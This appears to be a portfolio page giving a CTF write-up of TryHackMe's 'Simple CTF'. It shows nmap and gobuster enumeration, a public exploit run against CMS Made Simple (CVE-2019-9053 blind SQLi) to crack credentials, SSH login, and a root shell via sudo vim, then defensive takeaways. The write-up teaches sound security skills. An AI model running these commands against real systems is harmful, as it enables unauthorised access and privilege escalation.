@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe — Simple CTF — Atharva Kulkarni</title>
+  <meta name="description" content="CVE-2019-9053 time-based blind SQLi in CMS Made Simple, then vim sudo GTFOBins privilege escalation. TryHackMe Simple CTF writeup by Atharva Kulkarni.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@400;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #080b10; --bg2: #0d1117; --surface: #141c26;
+      --border: #1e2d3d; --accent: #00d4ff; --accent2: #00ff9d;
+      --accent3: #ff4d6d; --text: #e8edf2; --text2: #8899aa; --text3: #556677;
+      --font-display: 'Barlow Condensed', sans-serif;
+      --font-mono: 'Share Tech Mono', monospace;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--font-mono); line-height: 1.8; padding: 0; }
+    .wr-header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 1rem 2rem; display: flex; align-items: center; gap: 1rem; position: sticky; top: 0; z-index: 100; }
+    .wr-back { color: var(--accent); text-decoration: none; font-size: .8rem; letter-spacing: .1em; text-transform: uppercase; }
+    .wr-back:hover { color: var(--text); }
+    .wr-header-title { font-family: var(--font-display); font-size: 1rem; font-weight: 700; color: var(--text2); }
+    .wr-hero { padding: 3rem 2rem 2rem; max-width: 860px; margin: 0 auto; }
+    .wr-platform-tag { display: inline-block; background: rgba(0,212,255,.08); border: 1px solid rgba(0,212,255,.2); color: var(--accent); font-size: .7rem; letter-spacing: .12em; text-transform: uppercase; padding: .25rem .7rem; border-radius: 2px; margin-bottom: 1rem; }
+    .wr-title { font-family: var(--font-display); font-size: clamp(1.6rem,4vw,2.4rem); font-weight: 800; color: var(--text); text-transform: uppercase; letter-spacing: .06em; margin-bottom: .5rem; }
+    .wr-meta { display: flex; gap: 1.5rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .wr-badge { font-size: .72rem; padding: .25rem .7rem; border-radius: 2px; font-family: var(--font-mono); }
+    .wr-badge.easy { background: rgba(0,255,157,.1); color: var(--accent2); border: 1px solid rgba(0,255,157,.2); }
+    .wr-badge.medium { background: rgba(255,193,7,.1); color: #ffc107; border: 1px solid rgba(255,193,7,.2); }
+    .wr-badge.category { background: rgba(0,212,255,.08); color: var(--accent); border: 1px solid rgba(0,212,255,.15); }
+    .wr-summary { background: var(--surface); border: 1px solid var(--border); border-radius: 4px; padding: 1.2rem 1.5rem; margin-bottom: 2.5rem; }
+    .wr-summary-row { display: flex; gap: 1rem; padding: .35rem 0; border-bottom: 1px solid var(--border); font-size: .8rem; }
+    .wr-summary-row:last-child { border-bottom: none; }
+    .wr-summary-key { color: var(--accent); min-width: 120px; flex-shrink: 0; }
+    .wr-summary-val { color: var(--text); font-family: var(--font-mono); }
+    .wr-flag { color: var(--accent2); letter-spacing: .05em; }
+    .wr-body { max-width: 860px; margin: 0 auto; padding: 0 2rem 4rem; }
+    .wr-phase { margin-bottom: 3rem; }
+    .wr-phase-title { font-family: var(--font-display); font-size: 1.2rem; font-weight: 800; text-transform: uppercase; letter-spacing: .1em; color: var(--accent); border-left: 3px solid var(--accent); padding-left: .8rem; margin-bottom: 1.2rem; }
+    .wr-h3 { font-family: var(--font-display); font-size: 1rem; font-weight: 700; text-transform: uppercase; letter-spacing: .08em; color: var(--text2); margin: 1.5rem 0 .6rem; }
+    .wr-p { font-size: .85rem; color: var(--text2); margin-bottom: .9rem; line-height: 1.8; }
+    .wr-p strong { color: var(--text); }
+    .wr-code { background: var(--bg2); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: 0 4px 4px 0; padding: 1rem 1.2rem; margin: .8rem 0 1.2rem; font-family: var(--font-mono); font-size: .78rem; color: var(--accent2); overflow-x: auto; white-space: pre; line-height: 1.6; }
+    .wr-inline-code { background: var(--surface); border: 1px solid var(--border); color: var(--accent); padding: .1rem .4rem; border-radius: 2px; font-size: .82em; }
+    .wr-table { width: 100%; border-collapse: collapse; margin: .8rem 0 1.5rem; font-size: .8rem; }
+    .wr-table th { background: var(--surface); color: var(--accent); text-transform: uppercase; letter-spacing: .08em; padding: .5rem .8rem; text-align: left; border: 1px solid var(--border); font-size: .72rem; }
+    .wr-table td { padding: .5rem .8rem; border: 1px solid var(--border); color: var(--text2); }
+    .wr-table tr:hover td { background: rgba(255,255,255,.02); }
+    .wr-lesson { background: rgba(0,255,157,.05); border: 1px solid rgba(0,255,157,.2); border-radius: 4px; padding: 1rem 1.2rem; margin-top: 2rem; }
+    .wr-lesson-title { color: var(--accent2); font-size: .72rem; letter-spacing: .12em; text-transform: uppercase; margin-bottom: .5rem; }
+    .wr-lesson p { font-size: .83rem; color: var(--text2); }
+    .wr-footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); font-size: .75rem; color: var(--text3); }
+    .wr-footer a { color: var(--accent); text-decoration: none; }
+  </style>
+</head>
+<body>
+  <div class="wr-header">
+    <a href="../index.html" class="wr-back">&larr; Back to Portfolio</a>
+    <span class="wr-header-title">CTF Writeup</span>
+  </div>
+
+  <div class="wr-hero">
+    <span class="wr-platform-tag">TryHackMe</span>
+    <h1 class="wr-title">Simple CTF</h1>
+    <div class="wr-meta">
+      
+      <span class="wr-badge category">Web</span>
+      <span class="wr-badge category">SQLi</span>
+      <span class="wr-badge category">Privilege Escalation</span>
+    </div>
+    <div class="wr-summary">
+      <div class="wr-summary-row"><span class="wr-summary-key">Target</span><span class="wr-summary-val">CMS Made Simple 2.2.8 web app</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">CVE</span><span class="wr-summary-val">CVE-2019-9053 (time-based blind SQLi)</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Escalation</span><span class="wr-summary-val">vim via sudo NOPASSWD (GTFOBins)</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Severity</span><span class="wr-summary-val"><span style="display:inline-block;font-size:.7rem;letter-spacing:.08em;padding:.1rem .55rem;border-radius:3px;color:#ff4d6d;font-weight:700;background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.2);">CRITICAL</span> <span style="color:var(--text3);font-size:.72rem;">(CVSSv3 9.8)</span></span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">References</span><span class="wr-summary-val">CVE-2019-9053 &middot; CWE-89 &middot; OWASP A01:2021</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">User Flag</span><span class="wr-summary-val wr-flag">G00d j0b, keep up!</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Root Flag</span><span class="wr-summary-val wr-flag">W3ll d0n3. You made it!</span></div>
+    </div>
+  </div>
+
+  <div class="wr-body">
+    <div class="wr-phase">
+      <h2 class="wr-phase-title">1. Enumeration &mdash; Nmap</h2>
+      <p class="wr-p">A full port scan reveals three open services. Note that SSH is on the <strong>non-standard port 2222</strong> &mdash; a detail that matters later.</p>
+      <div class="wr-code">$ nmap -sC -sV -p- TARGET
+21/tcp    open  ftp     vsftpd
+80/tcp    open  http    Apache httpd
+2222/tcp  open  ssh     OpenSSH</div>
+      <table class="wr-table">
+        <thead><tr><th>Port</th><th>Service</th><th>Relevance</th></tr></thead>
+        <tbody>
+          <tr><td>21</td><td>FTP</td><td>Anonymous access / file leads</td></tr>
+          <tr><td>80</td><td>HTTP</td><td>Web app &mdash; primary attack surface</td></tr>
+          <tr><td>2222</td><td>SSH</td><td>Non-standard port for later login</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="wr-phase">
+      <h2 class="wr-phase-title">2. Web Discovery &mdash; Gobuster</h2>
+      <p class="wr-p">Directory brute-forcing the web root uncovers a hidden application path.</p>
+      <div class="wr-code">$ gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt
+/simple   (Status: 301)</div>
+      <p class="wr-p">Browsing to <span class="wr-inline-code">/simple/</span> reveals the application and, critically, its version in the footer: <strong>CMS Made Simple version 2.2.8</strong>. Version disclosure is the pivot for CVE research.</p>
+    </div>
+
+    <div class="wr-phase">
+      <h2 class="wr-phase-title">3. Exploitation &mdash; CVE-2019-9053</h2>
+      <p class="wr-p">CMS Made Simple versions <strong>below 2.2.10</strong> are vulnerable to <span class="wr-inline-code">CVE-2019-9053</span>, a <strong>time-based blind SQL injection</strong> in the News module. Exploit-DB script <span class="wr-inline-code">46635.py</span> automates extraction of the username, password hash, and salt, then cracks the hash against a wordlist.</p>
+      <div class="wr-code">$ python 46635.py -u http://TARGET/simple --crack -w rockyou.txt
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4...
+[+] Password cracked: secret</div>
+      <p class="wr-p">Credentials recovered: <span class="wr-inline-code">mitch</span> / <span class="wr-inline-code">secret</span>.</p>
+    </div>
+
+    <div class="wr-phase">
+      <h2 class="wr-phase-title">4. Foothold &mdash; SSH on Port 2222</h2>
+      <p class="wr-p">The recovered credentials are reused for SSH &mdash; remembering the non-standard port from the Nmap scan.</p>
+      <div class="wr-code">$ ssh mitch@TARGET -p 2222
+mitch@TARGET's password: secret
+
+$ cat user.txt
+G00d j0b, keep up!</div>
+    </div>
+
+    <div class="wr-phase">
+      <h2 class="wr-phase-title">5. Privilege Escalation &mdash; vim sudo Escape</h2>
+      <p class="wr-p">Checking sudo rights shows <span class="wr-inline-code">mitch</span> can run <span class="wr-inline-code">vim</span> as root with no password. Per GTFOBins, <span class="wr-inline-code">vim</span> can spawn an interactive shell &mdash; and when launched under sudo, that shell runs as root.</p>
+      <div class="wr-code">$ sudo -l
+User mitch may run the following commands:
+    (root) NOPASSWD: /usr/bin/vim
+
+# GTFOBins vim sudo escape
+$ sudo vim -c ':!/bin/sh'
+
+# now root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+W3ll d0n3. You made it!</div>
+    </div>
+
+    <div class="wr-phase">
+      <div class="wr-phase-title">Key Takeaways</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:.8rem;">
+        <div style="background:rgba(0,212,255,.04);border:1px solid rgba(0,212,255,.15);border-radius:4px;padding:1rem;">
+          <div style="color:var(--accent);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.5rem;">Attacker Perspective</div>
+          <p class="wr-p">CVE-2019-9053 is a time-based blind SQLi &mdash; no output returned, but boolean logic reveals the database character by character. Once credentials are extracted, the sudo misconfiguration is a textbook GTFOBins privilege escalation.</p>
+        </div>
+        <div style="background:rgba(0,255,157,.04);border:1px solid rgba(0,255,157,.15);border-radius:4px;padding:1rem;">
+          <div style="color:var(--accent2);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.5rem;">Defender / Remediation</div>
+          <p class="wr-p">Patch promptly &mdash; CMS Made Simple 2.2.10 fixed this. Audit sudo permissions regularly. vim and other editors should never have NOPASSWD sudo access. Run web applications as a non-root user.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wr-footer"><a href="../index.html">&larr; atharvak161.github.io</a></div>
+</body>
+</html>
